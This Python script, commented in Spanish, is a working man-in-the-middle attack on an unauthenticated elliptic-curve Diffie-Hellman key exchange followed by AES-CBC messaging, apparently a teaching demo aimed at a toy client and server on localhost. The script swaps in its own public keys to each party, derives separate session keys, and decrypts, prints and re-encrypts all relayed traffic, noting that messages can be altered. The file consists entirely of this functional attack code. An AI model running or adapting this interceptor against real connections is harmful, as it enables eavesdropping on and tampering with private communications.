import socket
import json
import threading
from Crypto.PublicKey import ECC
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def pad(data):
    padding_len = 16 - len(data) % 16
    return data + bytes([padding_len] * padding_len)

def unpad(data):
    padding_len = data[-1]
    return data[:-padding_len]

def handle_client(client_conn, server_host, server_port):
    # Conectar al servidor real
    server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_conn.connect((server_host, server_port))
    print("Conectado al servidor real {}:{}".format(server_host, server_port))

    # El atacante genera dos pares de claves: uno para el cliente y otro para el servidor
    attacker_key_client = ECC.generate(curve='P-256')  # Para comunicación con el cliente
    attacker_pub_client = attacker_key_client.public_key()
    attacker_key_server = ECC.generate(curve='P-256')   # Para comunicación con el servidor
    attacker_pub_server = attacker_key_server.public_key()

    from Crypto.PublicKey.ECC import EccPoint

    # ---- Interceptar intercambio con el servidor ----
    # Recibir la clave pública del servidor real
    server_data = server_conn.recv(4096)
    server_pub_data = json.loads(server_data.decode())
    server_pub_x = int(server_pub_data["pub_x"])
    server_pub_y = int(server_pub_data["pub_y"])
    server_point = EccPoint(server_pub_x, server_pub_y, curve='P-256')

    # Enviar al cliente la clave pública del atacante (para su comunicación)
    attacker_pub_client_data = {"curve": "P-256", "pub_x": str(attacker_pub_client.pointQ.x), "pub_y": str(attacker_pub_client.pointQ.y)}
    client_conn.sendall(json.dumps(attacker_pub_client_data).encode())

    # ---- Interceptar intercambio con el cliente ----
    # Recibir la clave pública del cliente
    client_data = client_conn.recv(4096)
    client_pub_data = json.loads(client_data.decode())
    client_pub_x = int(client_pub_data["pub_x"])
    client_pub_y = int(client_pub_data["pub_y"])
    client_point = EccPoint(client_pub_x, client_pub_y, curve='P-256')

    # Enviar al servidor la clave pública del atacante (para su comunicación)
    attacker_pub_server_data = {"curve": "P-256", "pub_x": str(attacker_pub_server.pointQ.x), "pub_y": str(attacker_pub_server.pointQ.y)}
    server_conn.sendall(json.dumps(attacker_pub_server_data).encode())

    # Calcular claves simétricas con ambas partes
    shared_point_client = client_point * attacker_key_client.d
    shared_secret_client = int(shared_point_client.x)
    secret_bytes_client = shared_secret_client.to_bytes((shared_secret_client.bit_length() + 7) // 8, byteorder='big')
    symmetric_key_client = SHA256.new(secret_bytes_client).digest()[:24]

    shared_point_server = server_point * attacker_key_server.d
    shared_secret_server = int(shared_point_server.x)
    secret_bytes_server = shared_secret_server.to_bytes((shared_secret_server.bit_length() + 7) // 8, byteorder='big')
    symmetric_key_server = SHA256.new(secret_bytes_server).digest()[:24]

    print("Clave simétrica establecida con el cliente:", symmetric_key_client.hex())
    print("Clave simétrica establecida con el servidor:", symmetric_key_server.hex())

    # Función para reenviar mensajes (descifrando y volviendo a cifrar)
    def forward(source, dest, key_source, key_dest, direction):
        while True:
            data = source.recv(4096)
            if not data:
                break
            if len(data) < 16:
                continue
            iv = data[:16]
            ciphertext = data[16:]
            cipher = AES.new(key_source, AES.MODE_CBC, iv)
            plaintext_padded = cipher.decrypt(ciphertext)
            try:
                plaintext = unpad(plaintext_padded)
            except Exception:
                plaintext = plaintext_padded
            print(f"[{direction}] Mensaje interceptado:", plaintext.decode(errors="ignore"))
            # Aquí el atacante puede modificar el mensaje si lo desea
            new_iv = get_random_bytes(16)
            cipher_new = AES.new(key_dest, AES.MODE_CBC, new_iv)
            new_ciphertext = cipher_new.encrypt(pad(plaintext))
            dest.sendall(new_iv + new_ciphertext)

    # Iniciar dos hilos para reenviar mensajes en ambas direcciones
    thread_client_to_server = threading.Thread(target=forward, args=(client_conn, server_conn, symmetric_key_client, symmetric_key_server, "Cliente -> Servidor"))
    thread_server_to_client = threading.Thread(target=forward, args=(server_conn, client_conn, symmetric_key_server, symmetric_key_client, "Servidor -> Cliente"))
    thread_client_to_server.start()
    thread_server_to_client.start()
    thread_client_to_server.join()
    thread_server_to_client.join()

    client_conn.close()
    server_conn.close()
    print("Conexiones cerradas.")

def main():
    listen_host = '0.0.0.0'
    listen_port = 65434  # Puerto donde el atacante escucha al cliente
    attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attacker_socket.bind((listen_host, listen_port))
    attacker_socket.listen(1)
    print("Atacante escuchando en {}:{}".format(listen_host, listen_port))
    while True:
        client_conn, client_addr = attacker_socket.accept()
        print("Cliente conectado desde", client_addr)
        # Manejar cada conexión en un nuevo hilo
        threading.Thread(target=handle_client, args=(client_conn, 'localhost', 65433)).start()

if __name__ == "__main__":
    main()
